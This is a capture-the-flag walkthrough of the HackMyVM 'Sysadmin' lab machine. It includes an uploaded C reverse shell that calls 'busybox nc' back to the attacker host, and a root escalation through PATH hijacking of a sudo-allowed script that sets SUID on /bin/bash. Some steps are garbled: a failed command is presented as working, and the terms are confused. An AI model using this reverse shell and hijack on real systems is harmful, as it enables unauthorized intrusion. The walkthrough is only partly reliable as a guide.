@@ -1,0 +1,171 @@
+Today we have another easy listed machine to solve from HackMyVM which is a linux based machine like other machine that were easy this machine also gives IP and basic information to start penetration testing.
+
+
+Main IP :: 192.168.56.210
+
+Starting with all port scan we can go with this.
+
+Nmap scan report for 192.168.56.210
+Host is up (0.00012s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Now let's perform service and version detection scan.
+
+Nmap scan report for 192.168.56.210
+Host is up, received arp-response (0.00033s latency).
+Scanned at 2026-06-02 20:45:27 +1245 for 7s
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRmicDuAIhDTuUUa37WCIEK2z2F1aDUtiJpok20zMzkbe1B41ZvvydX3JHjf7mgl0F/HRQlGHiA23Il+dwr0YbbBa2ggd5gDl95RSHhuUff/DIC10OFbP3YU8A4ItFb8pR6dN8jr+zU1SZvfx6FWApSkTJmeLPq9PN889+ibvckJcOMqrm1Y05FW2VCWn8QRvwivnuW7iU51IVz7arFe8JShXOLu0ANNqZEXyJyWjaK+MqyOK6ZtoWdyinEQFua81+tBZuvS+qb+AG15/h5hBsS/tUgVk5SieY6cCRvkYFHB099e1ggrigfnN4Kq2GvzRUYkegjkPzJFQ7BhPyxT/kDKrlVcLX54sXrp0poU5R9SqSnnESXVM4HQfjIIjTrJFufc2nBF+4f8dH3qtQ+jJkcPEKNVSKKEDULEk1BSBdokhh1GidxQY7ok+hEb9/wPmo6RBeb1d5t11SP8R5UHyI/yucRpS2M8hpBaovJv8pX1VwpOz3tUDJWCpkB3K8HDk=
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI2Hl4ZEYgnoDQflo03hI6346mXex6OPxHEjxDufHbkQZVosDPFwZttA8gloBLYLtvDVo9LZZwtv7F/EIiQoIHE=
+|   256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILRLvZKpSJkETalR4sqzJOh8a4ivZ8wGt1HfdV3OMNY1
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: C Code Upload
+|_http-server-header: Apache/2.4.62 (Debian)
+MAC Address: 08:00:27:7A:F7:29 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+So starting with the port 80 and we will see that this is .c code uploader over here before starting to upload files into the server or machine directly let's try to fuzz for directories or files in the webserver.
+
+But not much data we had but reading the source page of the web server says an dangerous line
+
+<!--
+    gcc -std=c11 -nostdinc -I/var/www/include -z execstack -fno-stack-protector -no-pie test.c -o a.out
+    -->
+    
+which means that it is executing the file in backend server but without include so as soon as shell creates connection once file is deleted it will lose connection.  
+
+
+
+nano shell2.c
+                                                         
+┌──(root㉿kali)-[/home/kali/hackmyvm/sysadmin]
+└─# cat shell2.c                            
+int fork();
+int execve(const char*, char*const[], char*const[]);
+
+int main() {
+    if (fork() == 0) {
+        /* Rev Shell */
+        char *argv[] = {
+            "/bin/sh",
+            "-c",
+            "busybox nc 192.168.56.106 4444 -e /bin/bash",
+            0
+        };
+        execve(argv[0], argv, 0);
+    }
+    return 0;
+}
+
+trying with this shell on
+
+nc -lvnp 4444
+
+nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 192.168.56.210 32968
+id
+uid=1000(echo) gid=1000(echo) groups=1000(echo)
+
+Now stabilizing the shell we have for now.
+
+which python3
+/usr/bin/python3
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+echo@Sysadmin:/home/echo$ ^Z
+zsh: suspended  nc -lvnp 4444
+                                                         
+┌──(root㉿kali)-[/home/kali/hackmyvm/sysadmin]
+└─# stty raw -echo
+fg
+
+[1]  + continued  nc -lvnp 4444
+
+echo@Sysadmin:/home/echo$ export TERM=xterm
+echo@Sysadmin:/home/echo$ 
+
+echo@Sysadmin:/home/echo$ cat user.txt 
+flag{user-9592f6e02a7abaf9e38c0ef43e868cf3}
+echo@Sysadmin:/home/echo$ 
+
+and we have user.txt now
+
+TIME FOR PRIVILEGE ESCALATION::
+
+
+sudo -l
+Matching Defaults entries for echo on Sysadmin:
+    !env_reset, mail_badpass, !env_reset, always_set_home
+
+User echo may run the following commands on Sysadmin:
+    (root) NOPASSWD: /usr/local/bin/system-info.sh
+
+
+so we have this suid binary that we can run as root without password let's see what exactly is this binary.
+
+echo@Sysadmin:/home/echo$ cat /usr/local/bin/system-info.sh 
+#!/bin/bash
+
+#===================================
+# Daily System Info Report
+#===================================
+
+echo "Starting daily system information collection at $(date)"
+echo "------------------------------------------------------"
+
+echo "Checking disk usage..."
+df -h
+
+echo "Checking log directory..."
+ls -lh /var/log/
+find /var/log/ -type f -name "*.gz" -mtime +30 -exec rm {} \;
+
+echo "Checking critical services..."
+systemctl is-active sshd
+systemctl is-active cron
+
+echo "Collecting CPU and memory information..."
+cat /proc/cpuinfo
+free -m
+
+echo "------------------------------------------------------"
+echo "Report complete at $(date)"
+echo@Sysadmin:/home/echo$ cd /tmp
+echo@Sysadmin:/tmp$ "chmod +s /bin/bash" > cat 
+bash: chmod +s /bin/bash: No such file or directory
+echo@Sysadmin:/tmp$ chmod +x cat 
+echo@Sysadmin:/tmp$ export PATH=/tmp/:$PATH
+echo@Sysadmin:/tmp$ sudo -u root /usr/local/bin/system-info.sh
+
+
+as this file can run this we added a new binary to upgrade shell.
+ 
+OR we can do is create a file with content like 
+
+echo "chmod u+s /bin/bash" >> /tmp/ls
+
+after this fake ls is created now give this the path and echo@Sysadmin:/tmp$ sudo PATH=/tmp:$PATH /usr/local/bin/system-info.sh 
+
+and then /bin/bash -p
+
+bash-5.0# whoami
+root
+bash-5.0# more root.txt 
+flag{root-8b8a8b353298f798e3eb8628661617b6}
+bash-5.0# 
+ 
+
+as it we can do more by reading the root.txt file which will help us get our content.
